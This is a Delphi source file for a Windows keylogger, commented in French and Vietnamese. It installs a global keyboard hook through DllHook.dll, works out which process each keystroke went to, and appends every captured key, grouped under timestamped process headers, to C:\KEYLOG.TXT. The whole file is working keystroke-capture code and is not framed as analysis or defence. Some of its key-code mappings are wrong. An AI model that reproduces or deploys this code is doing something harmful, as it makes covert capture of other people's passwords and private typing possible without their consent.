unit f_key_f;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls;

type
  Tf_key = class(TForm)
    Edit1: TEdit;
    Label1: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure WndProc(var Message: TMessage); override;
	private
	public
	end;

var
  f_key: Tf_key;

  // Définition des prototype de fonctions contenues dans la dll
  // Voir le source de la dll pour plus de détails
function StartHook: Boolean; stdcall; external 'DllHook.dll';
function StopHook: Boolean; stdcall; external 'DllHook.dll';
function GetNextKey(var Key, ID: Integer): Boolean; stdcall; external 'DllHook.dll';

implementation

{$R *.dfm}

uses tlHelp32;

procedure psavetofile(); forward;
function fStrToWrite(key: Integer; nom: string; var Tra_ve_chuoi: string): Boolean; forward;

var
	ListeProcess: TStrings; // Biến có chứa danh sách các quá trình hiện tại
	Fichier: TextFile; // Biến có chứa các tập tin văn bản được viết
	lastpross: string;
	HandleFile: Integer; //bộ nhớ chia sẻ cho hwnd của các hình thức
	idmsg: Cardinal; //Thông tin liên lạc ID msg


  //------------------------------------------------------------------------------
  //------------------------------------------------------------------------------
  //------------------------------------------------------------------------------
  //recuperation du message envoyé depuis la DLL

procedure Tf_key.WndProc(var Message: TMessage);
begin
  if (message.Msg = idmsg) then
		psavetofile();
	inherited;
end;
//------------------------------------------------------------------------------


//------------------------------------------------------------------------------
//gestion de ce qui va etre écrit

function fStrToWrite(key: Integer; nom: string; var Tra_ve_chuoi: string): Boolean;
var
	phim:string;
begin
	if key >= 0 then
	begin
		if key=18 then
			phim:='Alt'
		else if key=17 then
			phim:='Ctrl'
		else if key=16 then
			phim:='Shift'
		else if key=91 then
			phim:='WinDow'
		else if key=9 then
			phim:='Tab'
		else if key=20 then
			phim:='Caps Lock'
		else if key=13 then
			phim:='Enter'
		else if key=8 then
			phim:='Backspace'
		else if key=86 then
			phim:='Del'
		else if key=112 then
			phim:='F1'
		else
			phim:= chr(key);
		Tra_ve_chuoi := IntToStr(key) + ' = ' +  phim;
		fStrToWrite := true;
  end
  else
    fStrToWrite := false;
end;
//------------------------------------------------------------------------------


//------------------------------------------------------------------------------
// Làm thế nào để cập nhật danh sách các quá trình 
// Nó được gọi là mỗi lần một IdProcess không hề có trong danh sách hiện hành
procedure MiseAJourListeProcess;
var
	h: Integer;
	me32: TProcessEntry32;

begin
	ListeProcess.Clear;
	h := CreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	me32.dwSize := sizeof(me32);
	if Process32First(h, me32) then
	begin
		repeat
			ListeProcess.Add(IntToHex(Me32.th32ProcessID, 8) + UpperCase(ExtractFileName(StrPas(Me32.szExeFile))));
		until not Process32Next(h, me32);
	end;
	CloseHandle(h);
end;
//------------------------------------------------------------------------------


//------------------------------------------------------------------------------
// Cherche le nom du fichier EXE en fonction de l'IdProcess

function ChercheNomProcess(ProcessId: Cardinal): string;
var
	i: Integer;
	Chaine: string;

begin
	Result := '';
	Chaine := IntToHex(ProcessID, 8);
	for i := 0 to listeProcess.Count - 1 do
	begin
		if Copy(ListeProcess[i], 1, 8) = Chaine then
		begin
			Result := Copy(ListeProcess[i], 9, Length(ListeProcess[i]) - 8);
			Break;
		end;
	end;
end;
//------------------------------------------------------------------------------

//------------------------------------------------------------------------------
procedure psavetofile(); //lưu tổ hợp phím
var
	ProcessId: Integer;
	Key: Integer;
	Ten_file_exe: string;
	towrite: string;

begin
	// Là một quan trọng là hiện tại ...
	while GetNextKey(Key, ProcessID) do
	begin
		// ... on cherche le nom de l'EXE ...
		Ten_file_exe := ChercheNomProcess(ProcessId);
		if Ten_file_exe = '' then
		begin
			//nếu tình cờ nó là một quá trình mới 
			// Chúng tôi cập nhật danh sách và chúng tôi cố gắng một lần nữa ...
			MiseAJourListeProcess;
			Ten_file_exe := ChercheNomProcess(ProcessId);
			if Ten_file_exe = '' then Ten_file_exe := '<INCONNU>';
		end;

		// ... enfin on stock la touche dans le fichier.
		if (fStrToWrite(key, Ten_file_exe, towrite)) then
    begin
			if lastpross = Ten_file_exe then
			begin
				WriteLn(Fichier, towrite);
				f_key.Edit1.Text:= towrite;
			end
      else
			begin
				WriteLn(Fichier, '-------------------------------------------------');
				WriteLn(Fichier, Ten_file_exe + ' - ' + TimeToStr(Time));
				WriteLn(Fichier, '-------------------------------------------------');
				WriteLn(Fichier, towrite);
				lastpross := Ten_file_exe;
			end;
		end;
	end;
end;
//------------------------------------------------------------------------------


//------------------------------------------------------------------------------
//creation de la forme

procedure Tf_key.FormCreate(Sender: TObject);
var
	PointeurLocal: ^hwnd;

begin
	idmsg := RegisterWindowMessage('MY_CDOPEN'); //enregistre le new msg

	//mappage ds la mémoire pour le passage du handle de la form a la dll
	HandleFile := CreateFileMapping($FFFFFFFF, nil, PAGE_READWRITE, 0, SizeOf(HWND), 'HWNDFORM');
	if HandleFile <> 0 then
	begin
		PointeurLocal := MapViewOfFile(HandleFile, FILE_MAP_WRITE, 0, 0, 0);
		if PointeurLocal <> nil then
			PointeurLocal^ := f_key.handle
		else
		begin
			Showmessage('Erreur de mappage hwndform');
			Application.Terminate;
		end;
	end
	else
	begin
		Showmessage('Erreur de mappage hwndform');
		Application.Terminate;
	end;
	//-------------------------------------------------------------------

	lastpross := '';
	AssignFile(Fichier, 'C:\KEYLOG.TXT');
	if FileExists('C:\KEYLOG.TXT') then Append(Fichier)
	else Rewrite(Fichier);
	// Lancement du hook
	if not StartHook then
	begin
		ShowMessage('Erreur de lancement du HOOK');
		Application.Terminate;
	end;
	ListeProcess := TStringList.Create;
end;
//------------------------------------------------------------------------------

//------------------------------------------------------------------------------
//fermeture de la form

procedure Tf_key.FormClose(Sender: TObject; var Action: TCloseAction);
begin
	ListeProcess.Free;
	StopHook;
	CloseFile(Fichier);
end;
//------------------------------------------------------------------------------

end.

